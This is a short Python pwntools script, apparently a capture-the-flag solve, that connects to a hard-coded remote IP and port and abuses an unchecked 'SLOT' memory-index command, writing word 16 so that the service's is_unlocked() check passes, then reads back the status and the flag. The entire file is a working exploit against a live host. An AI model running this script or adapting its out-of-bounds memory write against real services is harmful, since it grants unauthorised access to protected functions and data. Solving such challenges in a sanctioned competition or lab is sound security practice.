#!/usr/bin/env python3
from pwn import *

context.log_level = "error"

HOST, PORT = "109.123.232.54", 9113


def main():
    p = remote(HOST, PORT)
    p.recvuntil(b"\n> ", timeout=5)

    def cmd(line):
        p.sendline(line.encode())
        return p.recvuntil(b"\n> ", timeout=5)

    # is_unlocked() reads the i32 at linear-memory byte offset 64.
    # The front panel indexes 32-bit words, so word 16 == byte 64.
    cmd("SLOT 16 1")

    status = cmd("STATUS").decode().splitlines()[0].strip()
    flag = cmd("REPORT").decode().splitlines()[0].strip()

    p.close()
    print(status)
    print(flag)


if __name__ == "__main__":
    main()
